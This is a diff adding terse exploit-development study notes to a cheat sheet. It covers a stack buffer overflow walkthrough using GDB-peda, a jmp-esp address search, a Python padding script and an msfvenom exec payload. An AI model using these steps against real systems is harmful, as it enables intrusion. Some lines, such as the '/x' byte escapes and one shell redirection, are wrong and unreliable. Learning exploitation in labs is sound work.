@@ -254,17 +254,41 @@ right click > patch instruction		# patch stuffffff
 file > export program > binary > <renamefile> > ok > (on windows) remove .bin extention & run
 
 
+###### Exploit Development
+program can take... takeing input, taking paramaters
 
+## GDB Stuff
+gdb <program>		# starts gdb-peda
+peda$> pdisass main
+peda$> pdisass <function>		# look for red functions that you can use buffer overflow on
+wiremask.eu > tools > copy pattern into program
+find EIP registar value, copy hex into wiremask, get offset
+# make python script
+	buff = "A" * 62		# fills buffer
+	eip = "B" * 4		# place holder for exploite
+	print(buff + eip)
 
+peda$> run <<< $(python buff.py) 		# sends script to input
 
+env - gdb <program>		# starts plane jane gdb
+gdb> show env		# shows env variables
+gdb> unset env <variable>		# unset listed variable, do for all listed with show 
+gdb> run		# run program and overflow it with trash
+gdb> info proc map		# shows mem values
+gdb> find /b <fist mem addr after [heap]>, <second mem addr on [stack]>, 0xff, 0xe4		# finds jump vals between the start & end of heap 
+# if error, use mem addr directly above second value (^ this one)
+# copy a few from the middle and past into script as a comment for reference
+nop = '\x90' * 10		# add to script (optional), no op slead for safty reasons, add var to print statement aswell
+# enter reverse byte mem value for one jump val as eip in script (see below)
+	eip = '/x33/x97/xf6/xf7'		# if value is 0xf7f69733 split on bytes: 0xf7 f6 97 33 and reverse
 
+msfvenom -p linux/x86/exec cmd="whoami" -b '\x00' -f python		# make payload, copy and past result into script
+	# operating sys ^ | command ^ | bad values ^ | format ^
+print(buff + eip + nop + buf)		# add 'buf' to print statement in script
 
-
-
-
-
-
-
+./<program> <<< $(python <script.py)		# save script and run on program
+./<program> < $(python <script.py)		# use this instead if program takes parameter instead of input
+# if works change payload  to something usefull (like cat <file>) and run again
 
 
 
